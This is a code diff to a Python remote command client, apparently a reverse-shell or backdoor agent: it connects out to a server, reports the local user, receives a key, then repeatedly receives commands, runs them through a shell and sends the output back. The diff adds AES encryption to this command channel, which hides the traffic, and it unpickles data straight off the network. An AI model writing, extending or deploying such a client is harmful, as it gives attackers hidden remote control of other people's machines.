@@ -20,13 +20,13 @@ key = []
 
 
 def encryptAES(message, key):
-    obj = AES.new(key[0], AES.MODE_CBC, key[1])
+    obj = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
     ciphertext = obj.encrypt(message)
     return ciphertext
 
 
 def decryptAES(ciphertext, key):
-    obj2 = AES.new(key[0], AES.MODE_CBC, key[1])
+    obj2 = AES.new(key[0][0], AES.MODE_CFB, key[0][1])
     message = obj2.decrypt(ciphertext)
     return message
 
@@ -37,20 +37,20 @@ def popenExecution(data):
     return str(command.stdout.read() + command.stderr.read(), "utf-8")
 
 
-#   --> Send a payload to the server
+#   --> Send a payload to the server, serializes into an encryption
 def send(socket, payload):
     try:
-        socket.send(pickle.dumps(payload))
+        socket.send(pickle.dumps(encryptAES(payload, key))) #Serialize --> encrypt --> send
     except Exception as e:
         print(e)
         time.sleep(1)
-        
-#   --> simple receive function, expects a command, calls for a send right after
+
+#   --> Receives a command, deserializes into a decryption, into a execution. Sends the output of that back
 def receive(socket):
     try:
-        message = pickle.loads(socket.recv(2048))
-        send(socket, popenExecution(message))
-        print(message)
+        message = decryptAES(pickle.loads(socket.recv(2048)), key) #deserialize --> decrypt
+        send(socket, popenExecution(message)) # --> execute 
+        print(message) #show what you got || SAFE TO REMOVE
 
     except Exception as e:
         print(e)
@@ -60,8 +60,10 @@ def main():
     socket.connect(serverAddress)
     #Standard command to identify who this machine is
     socket.send(pickle.dumps(popenExecution("who").split()[0])) 
-    key = pickle.loads(socket.recv(2048))
+    x = pickle.loads(socket.recv(2048))
+    key.append(x)
     print(key)
+
     while True:
         receive(socket)
 
